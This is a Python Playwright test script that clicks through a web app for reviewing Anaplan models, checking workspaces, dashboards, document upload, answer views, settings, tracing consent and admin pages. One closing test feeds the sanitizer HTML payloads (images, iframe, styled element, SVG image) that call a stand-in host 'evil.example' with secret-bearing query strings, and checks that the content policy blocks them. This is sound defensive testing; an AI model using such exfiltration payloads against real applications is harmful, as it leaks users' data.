"""Click through docs/WALKTHROUGH.md in a real browser (Playwright, the installed Edge or Chrome) against a server
where the demo workspaces exist and the scripted questions have been asked (tools/demo.py reset, then run).

  .venv/Scripts/python tools/ui_check.py --base http://localhost:8766 [--user admin --password ...] [--shots out/ui]

It signs in when the server has logins, then checks what the walkthrough says is on screen: the workspace dropdown,
the dashboard panels, the documents page (and an upload, then its removal), each answer pattern, concise mode with
explain and show diagram, the context view and run timeline, Settings, and the admin panel. Exit 1 if anything fails.
"""
from __future__ import annotations
import argparse, json, pathlib, sys, urllib.request

ROOT = pathlib.Path(__file__).resolve().parents[1]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:8765"); ap.add_argument("--user"); ap.add_argument("--password"); ap.add_argument("--shots", default=str(ROOT / "out" / "ui"))
    ap.add_argument("--member", help="a non-admin login, for the tracing opt-in check"); ap.add_argument("--member-password")
    a = ap.parse_args()
    from playwright.sync_api import sync_playwright
    shots = pathlib.Path(a.shots); shots.mkdir(parents=True, exist_ok=True)
    results: list[tuple[bool, str, str]] = []

    def check(label, cond, detail=""):
        results.append((bool(cond), label, str(detail)[:160]))
        print(("  ok   " if cond else "  FAIL ") + label + (f"  [{str(detail)[:160]}]" if detail and not cond else ""))

    with sync_playwright() as pw:
        browser = None
        for channel in ("msedge", "chrome"):
            try:
                browser = pw.chromium.launch(channel=channel, headless=True); break
            except Exception:
                continue
        ctx = browser.new_context(viewport={"width": 1600, "height": 1000}, reduced_motion="reduce", color_scheme="dark")
        page = ctx.new_page()
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)[:200]))
        blocked: list[str] = []                       # what the Content-Security-Policy refused while the app was used normally
        page.on("console", lambda m: blocked.append(m.text[:200]) if "Content Security Policy" in m.text else None)
        page.goto(a.base + "/app/", wait_until="networkidle")
        if page.locator(".ds-auth").count():
            check("sign-in page: /architect, your Anaplan build buddy, with Bert saying hello and the not-affiliated line", "your Anaplan build buddy" in page.locator(".ds-auth").inner_text()
                  and page.locator(".ds-auth [data-bert='hello']").count() == 1 and "Not affiliated with or endorsed by Anaplan" in page.locator(".ds-auth").inner_text())
            check("sign-in page: no signup, and the notice before uploading", page.locator(".ds-auth").inner_text().count("There is no signup") == 1 and "BEFORE YOU UPLOAD" in page.locator(".ds-auth").inner_text().upper())
            page.screenshot(path=str(shots / "00-sign-in.png"))
            page.fill("#u", a.user or ""); page.fill("#p", a.password or ""); page.click(".ds-auth .go")
            page.wait_for_selector(".ds-side", timeout=20000)
            check("signed in", True)
        page.wait_for_selector(".ds-side", timeout=20000)
        page.wait_for_timeout(1500)

        def wait_until(expr: str, timeout: int = 20000):          # polled: the page's policy forbids eval, which wait_for_function relies on
            import time
            end = time.time() + timeout / 1000
            while time.time() < end:
                if page.evaluate("() => !!(" + expr + ")"):
                    return
                page.wait_for_timeout(200)
            raise AssertionError("timed out waiting for: " + expr)

        def api(path):
            return page.evaluate("async p => (await fetch(p)).json()", path)
        estates = api("/api/estates")
        mine = {w["key"]: w["id"] for w in api("/api/demo")["workspaces"]}      # this login's demo workspaces, not another workspace of the same name
        cg = next(e for e in estates if e["id"] == mine["caldergate-demo"]); st = next(e for e in estates if e["id"] == mine["caldergate-stores-demo"])
        convs = {c["title"]: c["id"] for c in api(f"/api/estates/{cg['id']}/conversations")}
        sconvs = {c["title"]: c["id"] for c in api(f"/api/estates/{st['id']}/conversations")}
        newest = lambda rows: {c["title"]: c["id"] for c in sorted(rows, key=lambda c: c.get("updated") or c["created"])}      # a question asked twice: the latest answer
        convs, sconvs = newest(api(f"/api/estates/{cg['id']}/conversations")), newest(api(f"/api/estates/{st['id']}/conversations"))
        find = lambda d, start: next((v for k, v in d.items() if k.startswith(start)), None)

        def open_(eid, path=""):
            page.goto(f"{a.base}/app/#/e/{eid}" + (f"/{path}" if path else ""), wait_until="networkidle"); page.wait_for_timeout(1800)

        # 1. workspaces
        open_(cg["id"])
        check("brand: /architect by CodelessOps, and the page is titled /architect: your Anaplan build buddy", "by CodelessOps" in page.locator(".ds-brand").inner_text()
              and "/architect" in page.locator(".ds-brand").inner_text().replace(" ", "") and page.title() == "/architect: your Anaplan build buddy" and "Anaplan Architect" not in page.locator("body").inner_text())
        page.click(".ds-ws > button"); page.wait_for_timeout(300)
        pop = page.locator(".ds-ws .pop").inner_text()
        check("workspace dropdown lists both demo workspaces and says a workspace is separate", "Caldergate Stores" in pop and "Nothing is remembered across workspaces" in pop)
        page.screenshot(path=str(shots / "01-workspace-dropdown.png"))
        page.click(".ds-ws .pop a.row:has-text('Caldergate Stores')"); page.wait_for_timeout(2500)
        check("switching shows the other workspace and only its chats", "Caldergate Stores" in page.locator("h1.ds-q").inner_text() and "account mapping" not in page.locator(".ds-threads").inner_text())
        # 2. dashboard
        open_(cg["id"])
        txt = page.locator(".ds-main").inner_text()
        check("dashboard: model map, what was tested, where the cells are", all(k in txt.upper() for k in ("MODEL MAP", "WHAT WAS TESTED", "WHERE THE CELLS ARE")))
        tests = api(f"/api/estates/{cg['id']}")["tests"]
        check(f"dashboard: 4 models, 426 line items, {tests['found']} of {tests['total']} tests found something", "426" in txt and f"{tests['found']} / {tests['total']}" in txt.replace("\n", " "))
        check("dashboard: who reads whom, calculation time, functions, longest formulas, module roles",
              all(k in txt.upper() for k in ("WHO READS WHOM", "WHERE THE CALCULATION TIME GOES", "FUNCTIONS IT LEANS ON", "LONGEST FORMULAS", "WHAT THE MODULES ARE FOR")))
        boxes = page.evaluate("""() => { const svg = [...document.querySelectorAll('.ds-fig svg')].find(s => (s.getAttribute('aria-label') || '').startsWith('Feeds between models'));
            const r = [...svg.querySelectorAll('rect')].map(x => ({ x: +x.getAttribute('x'), y: +x.getAttribute('y'), w: +x.getAttribute('width'), h: +x.getAttribute('height') }));
            const vb = svg.viewBox.baseVal, box = svg.getBoundingClientRect(), panel = svg.closest('.fb').getBoundingClientRect();
            return { cards: r.filter(b => b.w > 100), labels: r.filter(b => b.w <= 100), W: vb.width, H: vb.height, left: box.left - panel.left, right: panel.right - box.right } }""")
        hit = lambda a, b: a["x"] < b["x"] + b["w"] and b["x"] < a["x"] + a["w"] and a["y"] < b["y"] + b["h"] and b["y"] < a["y"] + a["h"]
        cards, labels = boxes["cards"], boxes["labels"]
        clash = [1 for i, a in enumerate(cards) for b in cards[i + 1:] if hit(a, b)] + [1 for l in labels for c in cards if hit(l, c)]
        check("model map: four cards, none on another, no feed label on a card, all inside the drawing", len(cards) == 4 and not clash and all(0 <= b["x"] and b["x"] + b["w"] <= boxes["W"] and 0 <= b["y"] and b["y"] + b["h"] <= boxes["H"] for b in cards + labels), boxes)
        check("model map: centred in its panel", abs(boxes["left"] - boxes["right"]) < 40, (boxes["left"], boxes["right"]))
        page.click(".ds-sec .ds-seg button:has-text('Workforce Planning')"); page.wait_for_timeout(1200)
        check("a missing export column is said: Workforce Planning has no Calculation Effort", "No Calculation Effort column" in page.locator(".ds-main").inner_text())
        page.screenshot(path=str(shots / "02-dashboard.png"), full_page=False)
        # 3. documents
        page.evaluate("""async eid => { const csrf = (document.cookie.match(/csrf=([^;]+)/) || [])[1]; for (const d of (await (await fetch('/api/estates/' + eid + '/documents')).json()).documents)
            if (d.title === 'Walkthrough note') await fetch('/api/documents/' + d.id, { method: 'DELETE', headers: csrf ? { 'x-csrf': csrf } : {} }) }""", cg["id"])      # one left by a run that stopped half way
        open_(cg["id"], "documents")
        txt = page.locator(".ds-main").inner_text()
        check("documents: 6 of 20, the limits and no-OCR note, six cards", "6 OF 20" in txt.upper() and "no OCR" in txt and page.locator(".ds-doc").count() == 6)
        page.set_input_files(".ds-drop input[type=file]:not([hidden]), .ds-drop input[type=file]", {"name": "Walkthrough note.md", "mimeType": "text/markdown", "buffer": b"# Walkthrough note\n\nSYS05 FX Rates is loaded by hand.\n\n## Second part\n\nNothing else."})
        wait_until("document.querySelectorAll('.ds-doc').length === 7", 30000)
        card = page.locator(".ds-doc", has_text="Walkthrough note")
        check("uploading a document adds a card with its sections and the objects it names", "2 sections" in card.inner_text() and "SYS05 FX Rates" in card.inner_text())
        page.once("dialog", lambda d: d.accept())
        card.locator("button:has-text('Remove')").click()
        wait_until("document.querySelectorAll('.ds-doc').length === 6", 30000)
        check("removing it takes the card away", page.locator(".ds-doc").count() == 6)
        page.screenshot(path=str(shots / "03-documents.png"))
        # 4. why, with the quoted passage
        open_(cg["id"], "chat/" + find(convs, "Why is the account mapping"))
        t = page.locator(".ds-turn").first
        check("why: a source card with the quoted sentence marked, from the design decision record, section 4.3", t.locator(".ds-src mark").count() >= 1 and "4.3 Opex forecast logic" in t.inner_text())
        check("why: the verdict is verified with quotes found, and Bert is nowhere in the answer", t.locator("[data-bert], img[src*='bert']").count() == 0 and "Found the source." not in t.inner_text() and "VERIFIED" in t.locator(".ds-foot").inner_text().upper() and "quotes found" in t.locator(".ds-foot").inner_text())
        page.screenshot(path=str(shots / "04-why.png"))
        t.locator(".ds-src .sh").first.click(); page.wait_for_selector(".evidence", timeout=10000); page.wait_for_timeout(800)
        check("clicking the source card opens the whole section in the drawer", "The section" in page.locator(".evidence").inner_text() and "Quoted in answers" in page.locator(".evidence").inner_text())
        page.keyboard.press("Escape")
        # context and run
        t.locator(".ds-foot button.ctx").click(); page.wait_for_selector(".ds-ctxpanel", timeout=10000)
        cp = page.locator(".ds-ctxpanel").inner_text()
        check("context view: the total against 32,000, the items with a reason each, what was left out", "of 32,000 tokens" in cp and "WHY IT IS HERE" in cp.upper() and "LEFT OUT" in cp.upper() and "sections pulled" in cp)
        check("context view: the design record's other sections are listed as not sent", "other sections" in cp and "not sent" in cp.lower())
        check("run timeline: search_documents then get_section then the validator", cp.find("search_documents") < cp.find("get_section") < cp.rfind("validator") and "no outside account" in cp)
        page.locator(".ds-ctxpanel").scroll_into_view_if_needed(); page.screenshot(path=str(shots / "05-context-and-run.png"))
        # 5. not recorded
        open_(cg["id"], "chat/" + find(convs, "Why is the margin module"))
        check("a why-question no document answers shows the Not recorded card", page.locator(".ds-none.bert").count() == 1 and "does not guess" in page.locator(".ds-none.bert").inner_text())
        page.screenshot(path=str(shots / "06-not-recorded.png"))
        # 6. build plan: instructions, in the order a builder reads them
        def plan_chat(mode):          # the latest chat that asked for the lookup-module plan in this mode
            rows = sorted(api(f"/api/estates/{cg['id']}/conversations"), key=lambda c: c.get("updated") or c["created"], reverse=True)
            return next((c["id"] for c in rows if c["title"].startswith("Give me a plan to build a lookup module") and (api(f"/api/conversations/{c['id']}")["turns"] or [{}])[0].get("mode") == mode), None)
        open_(cg["id"], "chat/" + plan_chat("full"))
        t = page.locator(".ds-turn").first
        txt = t.inner_text(); up = txt.upper()
        order = [up.find(k) for k in ("OVERVIEW", "WHAT YOU WILL BUILD", "WHAT ALREADY EXISTS THAT THIS USES", "FOLLOW THEM IN ORDER IN ANAPLAN")] + ([up.find("WHY THIS WAS WANTED")] if t.locator(".ds-src").count() else [])
        check("build plan: overview, what you will build, what already exists, steps, in that order; the passage it rests on comes after the plan, not on top", all(i >= 0 for i in order) and order == sorted(order), order)
        built = t.locator(".ds-mod:not(.chg)")
        check("build plan: under each module of what you will build, its line items with format, dimensions, summary and formula", built.count() >= 1 and all(built.nth(k).locator("tbody tr").count() >= 1 and "LINE ITEM" in built.nth(k).inner_text().upper() for k in range(built.count()))
              and t.locator(".ds-mod.chg .swap").count() >= 1)
        nums = [int(x.inner_text()) for x in t.locator(".ds-steplist .st .num").all()]
        kinds = [x.get_attribute("class").split()[-1] for x in t.locator(".ds-steplist .st").all()]
        check("build plan: numbered steps 1..n a builder follows: create the module, add each line item with its formula", nums == list(range(1, len(nums) + 1)) and len(nums) >= 3 and kinds[0] in ("module", "open", "list") and "line_item" in kinds and t.locator(".ds-steplist .fx .ds-f").count() >= 1, kinds)
        check("build plan: the switch-over is a step (the existing formula, from and to), then what to check", "change" in kinds and kinds.index("change") > max(i for i, k in enumerate(kinds) if k == "line_item") and "check" in kinds and t.locator(".ds-steplist .swap").count() >= 1, kinds)
        key = t.locator(".ds-stepkey").inner_text().lower()
        check("build plan: a key above the steps says what the number colours mean (build, change, check)", all(k in key for k in ("build something new", "change something that exists", "check, nothing is built"))
              and page.evaluate("() => { const k = document.querySelector('.ds-stepkey'), l = document.querySelector('.ds-steplist'); return k.getBoundingClientRect().top < l.getBoundingClientRect().top }"), key)
        check("build plan: what already exists is chips that open the object", t.locator(".ds-uses .obj").count() >= 2)
        t.locator(".ds-uses .obj").first.click(); page.wait_for_selector(".evidence", timeout=10000)
        check("build plan: clicking one opens it in the drawer", page.locator(".evidence").count() == 1)
        page.keyboard.press("Escape")
        check("build plan: every formula is marked valid, in full", t.locator(".ds-mod td .ds-valid").count() == t.locator(".ds-mod td .ds-f:not(.in)").count() >= 1)
        low = t.locator(".ds-uses").inner_text().lower() + " ".join(x.inner_text().lower() for x in t.locator(".ds-steplist, .ds-quiet, .ds-list").all())
        check("build plan: one quiet line for the order check, and none of the tool's own words", "order checked: nothing is built before what it refers to" in low and not any(w in low for w in ("candidate", "resolved", "topological", "toposort")))
        check("build plan: the export links", t.locator("a[href*='/plan?format=csv']").count() == 1)
        page.screenshot(path=str(shots / "07-build-plan.png"), full_page=True)
        # 7. overview, improve
        open_(cg["id"], "chat/" + find(convs, "Give me an overview"))
        check("overview: the model map and the treemap", "HOW DATA MOVES" in page.locator(".ds-turn").first.inner_text().upper() and page.locator(".ds-turn .ds-tmap").count() == 1)
        open_(cg["id"], "chat/" + find(convs, "How can we improve it"))
        txt = page.locator(".ds-turn").first.inner_text()
        check("improve: five ranked cards, each with the test behind it and cells and effort bars", page.locator(".ds-turn .ds-card").count() == 5 and "TEST 1.4" in txt.upper() and page.locator(".ds-turn .ds-meter").count() == 10)
        page.screenshot(path=str(shots / "08-improve.png"))
        # 8. implications
        open_(cg["id"], "chat/" + find(convs, "What are the implications of changing SYS05"))
        t = page.locator(".ds-turn").first
        check("implications: 48 line items, 10 modules, the rings with SYS05 FX Rates at the centre", "48" in t.locator(".ds-tiles").inner_text() and "THE CHANGE" in (t.locator(".ds-fig svg").first.text_content() or "") and t.locator(".ds-fig svg circle").count() > 48)
        t.locator(".ds-fig .ds-seg button:has-text('Steps')").click(); page.wait_for_timeout(400)
        check("implications: the Steps tab shows the same reach as a grid", "STEPS AWAY FROM SYS05 FX RATES" in (t.locator(".ds-fig svg").first.text_content() or "").upper())
        check("implications: by module, actions (the FX import last run 2023), other models, what it cannot see", all(k in t.inner_text().upper() for k in ("BY MODULE", "ACTIONS", "OTHER MODELS", "WHAT THIS CANNOT SEE")) and "2023-11-02" in t.inner_text())
        page.screenshot(path=str(shots / "09-implications.png"))
        # 9. concise: the steps and what exists
        cplan = plan_chat("concise")
        open_(cg["id"], "chat/" + cplan)
        t = page.locator(".ds-turn").first
        check("concise build plan: the steps and what already exists, no diagram until asked", t.locator(".ds-concise.plan .ds-steplist .st").count() >= 3 and t.locator(".ds-concise svg").count() == 0
              and "WHAT ALREADY EXISTS THAT THIS USES" in t.inner_text().upper() and "WHAT YOU WILL BUILD" not in t.inner_text().upper() and "CONCISE" in t.locator(".ds-kick").inner_text().upper())
        t.locator(".ds-concise button.ds-aff:has-text('show diagram')").click(); page.wait_for_timeout(300)
        check("show diagram opens the build order in place", t.locator(".ds-concise svg").count() == 1)
        t.locator(".ds-concise .st button.ds-aff:has-text('explain')").first.click(); page.wait_for_timeout(300)
        check("explain on a step opens its note in place", t.locator(".ds-concise .ex").count() >= 1)
        page.screenshot(path=str(shots / "10-concise-plan.png"))
        t.locator("button.ds-aff:has-text('expand to Full')").click(); page.wait_for_timeout(500)
        check("expand to Full draws the full plan without asking again", t.locator(".ds-mod").count() >= 1 and page.locator(".ds-turn").count() == 1)
        open_(cg["id"], "chat/" + find(convs, "What are the implications of changing CAL03"))
        t = page.locator(".ds-turn").first
        check("concise implications: a few lines, no figure until asked", t.locator(".ds-fig").count() == 0)
        t.locator("button.ds-aff:has-text('show diagram')").click(); page.wait_for_selector(".ds-turn .ds-fig svg", timeout=15000)
        check("show diagram draws the rings for CAL03 Opex (23 line items)", "23" in t.locator(".ds-tiles").inner_text())
        # 10. exact count
        open_(st["id"], "chat/" + find(sconvs, "How many line items use FINDITEM"))
        t = page.locator(".ds-turn").first
        check("exact count: 48 of 5,403, from the index", t.locator(".ds-count .big").inner_text().strip() == "48" and "5,403" in t.locator(".ds-count").inner_text())
        page.screenshot(path=str(shots / "11-exact-count.png"))
        # the model scope menu on the composer: the app's own list, dark, the chosen row in the accent
        open_(cg["id"], "chat/new")
        page.click(".ds-compose .ds-menu-b"); page.wait_for_selector(".ds-menu-l", timeout=5000)
        look = page.evaluate("""() => { const l = document.querySelector('.ds-menu-l'), sel = l.querySelector('.o.sel'), other = l.querySelector('.o:not(.sel)'); const cs = e => getComputedStyle(e);
            return { bg: cs(l).backgroundColor, ink: cs(other).color, sel: cs(sel).color, options: [...l.querySelectorAll('.o .t')].map(x => x.textContent), selects: document.querySelectorAll('.ds-compose select').length } }""")
        lum = lambda rgb: sum(int(x) for x in rgb[rgb.index("(") + 1:rgb.index(")")].split(",")[:3]) / 3
        check("scope menu: a dark list with readable options and the accent on the chosen one, no native select", lum(look["bg"]) < 40 and lum(look["ink"]) > 200 and look["sel"] == "rgb(52, 211, 153)" and look["selects"] == 0
              and look["options"][0] == "Whole workspace" and "Caldergate FP&A" in look["options"], look)
        page.screenshot(path=str(shots / "15-scope-menu.png"))
        page.click(".ds-menu-l .o:has-text('Caldergate FP&A')"); page.wait_for_timeout(300)
        check("scope menu: picking a model shows it on the button", "Caldergate FP&A" in page.locator(".ds-compose .ds-menu-b").first.inner_text())
        open_(cg["id"], "dependencies")
        nat = page.evaluate("() => [...document.querySelectorAll('select')].map(s => ({ scheme: getComputedStyle(s).colorScheme, opt: s.options.length ? getComputedStyle(s.options[0]).backgroundColor : '' }))")
        check("the native selects that remain are told the page is dark, options on the app's own surface", len(nat) >= 1 and all(n["scheme"] == "dark" and n["opt"] == "rgb(20, 25, 23)" for n in nat), nat[:2])
        # deleting a workspace: from the list, name typed back, says what goes with it
        li = (ROOT / "examples" / "caldergate" / "exports" / "1 Caldergate Data Hub" / "Line Items.csv").read_text(encoding="utf-8")
        page.evaluate("""async () => { const csrf = (document.cookie.match(/csrf=([^;]+)/) || [])[1]; for (const e of await (await fetch('/api/estates?archived=true')).json()) if (e.name === 'ui-check throwaway')
            await fetch('/api/estates/' + e.id, { method: 'DELETE', headers: { 'content-type': 'application/json', ...(csrf ? { 'x-csrf': csrf } : {}) }, body: JSON.stringify({ confirm: e.name }) }) }""")      # one left by a run that stopped half way
        made = page.evaluate("""async li => { const fd = new FormData(); fd.append('name', 'ui-check throwaway'); fd.append('model_names', 'Hub'); fd.append('line_items', new Blob([li], { type: 'text/csv' }), 'Line Items.csv');
            const csrf = (document.cookie.match(/csrf=([^;]+)/) || [])[1]; const r = await fetch('/api/estates', { method: 'POST', body: fd, headers: csrf ? { 'x-csrf': csrf } : {} }); return (await r.json()).id }""", li)
        open_(made); page.reload(wait_until="networkidle"); page.wait_for_timeout(2000)          # the list is read again: the workspace was made behind the page's back
        page.click(".ds-ws > button"); page.wait_for_timeout(300)
        row = page.locator(".ds-ws .pop a.row", has_text="ui-check throwaway")
        row.hover(); row.locator(".del").click(); page.wait_for_selector(".ds-modal", timeout=5000)
        dlg = page.locator(".ds-modal .box")
        check("delete a workspace: the dialog names it and says what goes with it", "ui-check throwaway" in dlg.inner_text() and all(k in dlg.inner_text() for k in ("1 model", "0 documents", "0 chats", "0 notes", "no undo")))
        check("delete a workspace: nothing happens until the name is typed back", dlg.locator("button.danger").is_disabled())
        dlg.locator("input").fill("ui-check throw"); check("delete a workspace: a wrong name keeps the button off", dlg.locator("button.danger").is_disabled())
        page.screenshot(path=str(shots / "16-delete-workspace.png"))
        dlg.locator("input").fill("ui-check throwaway"); dlg.locator("button.danger").click()
        wait_until("!document.querySelector('.ds-modal')", 20000); page.wait_for_timeout(1500)
        check("delete a workspace: it is gone and the app lands on another workspace", made not in [e["id"] for e in api("/api/estates?archived=true")] and made not in page.url and "/e/" in page.url, page.url)
        # 11. settings
        page.goto(a.base + "/app/#/settings", wait_until="networkidle"); page.wait_for_timeout(1200)
        txt = page.locator(".ds-main").inner_text()
        check("settings: answer mode switch, demo workspaces, what leaves this machine, About by CodelessOps", all(k in txt for k in ("Answer mode", "Sent to the model", "Built by CodelessOps")) and ("Reset the demo" in txt or "Create the demo" in txt))
        page.click(".ds-main .ds-seg button:has-text('Concise')"); page.wait_for_timeout(600)
        check("the answer mode is kept", api("/api/prefs")["answer_mode"] == "concise")
        page.click(".ds-main .ds-seg button:has-text('Full')"); page.wait_for_timeout(600)
        check("and set back to Full", api("/api/prefs")["answer_mode"] == "full")
        page.screenshot(path=str(shots / "12-settings.png"))
        # tracing: each login's own choice
        trace = (api("/api/auth/me").get("trace") or {})
        box = page.locator("#trace-setting").inner_text()
        if not trace.get("available"):
            check("tracing: with no tracer set up, Settings says so and offers nothing to turn on", "has none set up" in box and page.locator("#trace-setting .ds-seg").count() == 0)
        else:
            on = page.locator("#trace-setting .ds-seg button.on").inner_text()
            check("tracing (admin): Settings shows the three levels and says the admin's own questions are traced, nobody else's", page.locator("#trace-setting .ds-seg button").count() == 3
                  and on.lower() == {"off": "off", "structure": "structure", "content": "full"}[trace["level"]] and ("you cannot turn it on for them" in box if (api("/api/auth/me").get("user") or {}).get("role") == "owner" else True), (on, trace))
            page.locator("#trace-setting").scroll_into_view_if_needed(); page.screenshot(path=str(shots / "17-tracing-admin.png"))
            if a.member:
                ctx2 = browser.new_context(viewport={"width": 1600, "height": 1000}, reduced_motion="reduce", color_scheme="dark")
                p2 = ctx2.new_page()
                p2.goto(a.base + "/app/", wait_until="networkidle")
                note = p2.locator(".ds-auth").inner_text()
                check("tracing: the sign-in notice says questions are not sent unless the login turns it on", "unless you turn that on for yourself in Settings" in note)
                p2.fill("#u", a.member); p2.fill("#p", a.member_password or ""); p2.click(".ds-auth .go"); p2.wait_for_selector(".ds-side", timeout=20000)
                me2 = lambda: p2.evaluate("async () => (await (await fetch('/api/auth/me')).json()).trace")
                put2 = lambda lvl: p2.evaluate("async l => { const csrf = (document.cookie.match(/csrf=([^;]+)/) || [])[1]; await fetch('/api/prefs', { method: 'PUT', headers: { 'content-type': 'application/json', 'x-csrf': csrf }, body: JSON.stringify({ trace_level: l }) }) }", lvl)
                put2("off")                                    # as a login that has not turned it on
                p2.goto(a.base + "/app/#/settings", wait_until="networkidle"); p2.wait_for_timeout(1200)
                box2 = p2.locator("#trace-setting").inner_text()
                check("tracing (non-admin): off, with plain words on who can read it if turned on and that past traces are not deleted",
                      p2.locator("#trace-setting .ds-seg button.on").inner_text() == "Off" and "the person who runs this instance will be able to read what you send" in box2
                      and "does not delete what was already sent" in box2 and me2()["level"] == "off")
                asked = []
                p2.once("dialog", lambda d: (asked.append(d.message), d.accept()))
                p2.click("#trace-setting .ds-seg button:has-text('Structure')"); p2.wait_for_timeout(1200)
                check("tracing (non-admin): turning it on asks first, then it is on, with the time it was chosen", bool(asked) and "will be able to read" in asked[0] and me2()["level"] == "structure" and me2()["chosen_at"]
                      and p2.locator("#trace-setting .ds-seg button.on").inner_text() == "Structure" and "You chose Structure" in p2.locator("#trace-setting").inner_text())
                p2.locator("#trace-setting").scroll_into_view_if_needed(); p2.screenshot(path=str(shots / "18-tracing-member.png"))
                p2.click("#trace-setting .ds-seg button:has-text('Off')"); p2.wait_for_timeout(1200)
                check("tracing (non-admin): and off again, without being asked", me2()["level"] == "off")
                check("tracing (non-admin): no admin panel to look at anyone else's", p2.evaluate("async () => (await fetch('/api/admin/users')).status") == 403)
                ctx2.close()
        # 12. admin
        me = api("/api/auth/me")
        if me.get("user") and me["user"]["role"] == "owner":
            page.goto(a.base + "/app/#/admin", wait_until="networkidle"); page.wait_for_timeout(1200)
            txt = page.locator(".ds-main").inner_text()
            check("admin panel: a row per login with last seen, sign-ins, workspaces, questions, metered, cap", all(k in txt.upper() for k in ("LAST SEEN", "SIGN-INS", "WORKSPACES", "QUESTIONS", "METERED", "CAP")) and page.locator(".ds-admin tbody tr").count() >= 1)
            check("admin panel: create a login (no signup), with the demo workspaces", "there is no signup" in txt and "with the demo workspaces" in txt)
            head = page.locator(".ds-admin").first.locator("thead").inner_text().upper()
            check("admin panel: each login's tracing level is shown, with nothing to set it", "TRACING" in head and page.locator(".ds-admin").first.locator("tbody select, tbody button:has-text('Tracing')").count() == 0
                  and "cannot be set here" in txt)
            check("admin panel: every workspace by name, members and counts, with delete", "WORKSPACES" in txt.upper() and page.locator(".ds-admin").nth(1).locator("tbody tr").count() >= 2 and page.locator(".ds-admin").nth(1).locator("button:has-text('Delete')").count() >= 2)
            page.screenshot(path=str(shots / "13-admin.png"))
        # new workspace page
        page.goto(a.base + "/app/#/new", wait_until="networkidle"); page.wait_for_timeout(1000)
        check("new workspace: one row per model, Line Items required, Actions and Modules optional", "Line Items" in page.locator(".ds-main").inner_text() and page.locator(".ds-main input[type=file]").count() >= 3)
        page.set_input_files(".ds-main input[type=file] >> nth=0", {"name": "Line Items.csv", "mimeType": "text/csv", "buffer": b"Name\n"})
        check("new workspace: a file named after the export does not name the model", page.locator(".ds-main input[placeholder='FP&A']").first.input_value() == "")
        page.set_input_files(".ds-main input[type=file] >> nth=0", {"name": "Caldergate FP&A - Line Items.csv", "mimeType": "text/csv", "buffer": b"Name\n"})
        check("new workspace: a file that carries the model's name fills it in", page.locator(".ds-main input[placeholder='FP&A']").first.input_value() == "Caldergate FP&A")
        page.screenshot(path=str(shots / "14-new-workspace.png"))
        check("the policy refused nothing the app itself needs (fonts, styles, diagrams, scripts)", not blocked, blocked[:2])
        # what an answer may carry, asked of this browser: no image, no frame, no style; and the policy stops an image planted in the page from calling out
        clean = page.evaluate("""() => window.__architectSanitize('<p>ok <a href="https://example.org/x">link</a></p><img src="https://evil.example/c.png?d=FORMULAS"><img src="data:image/png;base64,AAAA"><iframe src="https://evil.example"></iframe><p style="background:url(https://evil.example/b)">x</p><svg><image href="https://evil.example/s"/></svg>')""")
        check("an answer cannot carry an image, a frame or a style: only its text and links are left", "evil.example" not in clean and "<img" not in clean and "<iframe" not in clean and "style=" not in clean and "ok" in clean and "<a " in clean, clean[:200])
        refused = page.evaluate("""() => new Promise(done => { const seen = []; document.addEventListener('securitypolicyviolation', e => seen.push(e.violatedDirective + ' ' + e.blockedURI));
            const i = new Image(); i.onload = () => done(['loaded']); i.onerror = () => setTimeout(() => done(seen), 100); i.src = 'https://evil.example/leak.png?d=secret'; document.body.appendChild(i); setTimeout(() => done(seen), 4000) })""")
        check("an image address pointing at another site is refused by the browser, under the policy", any("img-src" in r and "evil.example" in r for r in refused), refused)
        check("no script errors on any page", not errors, errors[:2])
        browser.close()
    bad = [r for r in results if not r[0]]
    print(f"\n{len(results) - len(bad)} of {len(results)} checks passed" + (": " + "; ".join(r[1] for r in bad) if bad else ""))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
